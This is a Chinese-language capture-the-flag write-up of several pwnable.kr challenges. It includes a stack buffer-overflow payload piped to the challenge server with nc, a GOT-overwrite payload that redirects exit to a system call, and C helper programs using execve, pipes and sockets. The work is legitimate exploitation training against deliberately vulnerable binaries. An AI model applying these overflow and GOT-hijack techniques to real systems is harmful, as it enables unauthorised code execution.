#bof
```
import struct
padding = 'A'*52 #这里不是算的
key_addr = struct.pack("I", 0xcafebabe)
print padding + key_addr
```
重点是确定填充的字节，由func中<br>
0x56555649 <+29>:   lea    eax,[ebp-0x2c]<br>
2C 是 44 填充44个A 再加上addr正好覆盖ebp这个地址，而<br>
0x56555654 <+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe<br>
所以只有再加8就正好覆盖了比较的地址，即key的位置。<br>
知道这个之后就可以利用python加管道进行pwn<br>
(python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000<br>

#flag
IDA打开之后就看到upx的字符，猜测是upx壳，linux下看了一下，apt安装下upx然后就可以解壳了<br>

#passcode
这题完全不知道怎么做，然后看国外大牛的wp。理解了半天，没懂。<br>
然后自己gdb调试，，忽然想起来，在调用welcome之后和调用login之后，<br>
esp的地址一样，这样因为函数开始的时候都有mov    ebp,esp。<br>
所以ebp(ebp在整个函数初始化指针之后是不会再改变的)就是可以认为是一样的，然后welcome调用结束后的数据并没有清楚，而是留在栈上，栈调用welcome结束后仅仅是把指针调整了，并没有清除数据，所以这里就是可以利用的地方。<br>
然后这个还有个条件，就是scanf("%d", passcode1);IDA逆向出来是__isoc99_scanf("%d");这样程序就会直接读取对应栈上的值<br>
0x70-0x10 = 0x60 = 96。只要有96个就能覆盖passcode1的值<br>
```
welcome:
0x0804862f <+38>:   lea    edx,[ebp-0x70]
0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
0x08048636 <+45>:    mov    DWORD PTR [esp],eax
0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
login:
0x0804857c <+24>:   mov    edx,DWORD PTR [ebp-0x10]
```
之后就是直接的plt利用了，不过这个也是理解了不少时间，实际上就是call exit的时候，实际上是先执行jmp _exit (_exit就是实际上exit的地址，而采用全局偏移表的方式存储，只要把这个地方改掉就行了。)
```
0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
0x080485de <+122>:   call   0x848450 <puts@plt>
0x080485e3 <+127>:   mov    DW0ORD PTR [esp],0x80487af
0x080485ea <+134>:   call   0x8048460 <system@plt>
```
system("")对应的地址：0x080485d7 = 134514135<br>
0x080485e3<br>
偏移表中exit对应的地址804a018<br>
于是就可以'A'*96 + '\x18\xa0\x04\x08' + '134514135\n'<br>

#random
开始看的rand没有思路，然而，，，如此简单。<br>
rand需要先srand初始化化下时间种子，否则rand的返回值一直固定。然后利用异或的性质，ok<br>

#input
```
./input `python -c "print 'A '*47 + '\x00' + '\x20\x0a\x0d'"`
```
发现不行，截取字符串的时候没有把\x00当成一个整体。<br>
然后只能又是找wp，发现都是用c来写的，定义个数组orz<br>
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
int main()
{
    char* padding[101] = {[0 ... 99] = "A"};//0~99全赋值为"A"
    padding['A'] = "\x00";
    padding['B'] = "\x20\x0a\x0d";
    padding['C'] = "31337";
    printf("Start\n");
    execve("/home/input/input",padding,NULL);//这里/home/input/input写成了home/input/input
    return 0;
}
```
第一个直接通过传参数就能通过。<br>
第二个就有点头疼了，查了一下fd句柄的说明<br>
0:stdin标准输入<br>
1:stdout<br>
2:stderr<br>
orz。然后又看wp，有一种是利用dup2来改变fd句柄，通过管道进行赋值<br>
```
    if(fork() == 0)
    {
        printf("Parent Processing is here...\n");
        dup2(pipe1[0],0);
        close(pipe1[1]);
        dup2(pipe2[0],2);
        close(pipe2[1]);
        execv("/home/input/input", padding, envp);
    }
    else
    {
        printf("Son processing is here...\n");
        write(pipe1[1], "\x00\x0a\x00\xff", 4);
        write(pipe2[1], "\x00\x0a\x02\xff", 4);
    }
```
这样前三个就over了<br>
然后第四个是文件读写，这个还是很简单的，查一下fopen和fwrite就好了<br>
最后一个是socket，之前搞arm的时候看了一点然而。。。<br>
```
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
    //建立socket
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
    //建立bind连接，端口是argv['C'],在前面设置为padding['C'] = "9000";
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);//开启监听
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
    //接收长度应该为4
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");
```
然后方法其实不是在c里面写个socket通信，直接python<br>
python -c "print '\xde\xad\xbe\xef'“ | nc 127.0.0.1 9000<br>
Tips: 本地ip地址是127.0.0.1<br>
9000好像不行，换一个。88888..试了好久，网络各种卡。。<br>
算了，还是写个socket吧。。<br>
```
int sd,cd;
struct sockaddr_in saddr, caddr;
sleep(5);
printf("Connecting\n");
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd == -1)
{
    printf("socket error~\n");
    return 0;
}
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons(atoi(padding['C']));
connect(sd, (struct sockaddr *)&saddr, sizeof(saddr));
send(sd, "\xde\xad\xbe\xef", 4, 0);
close(sd);
```
通过~<br>

to be continued
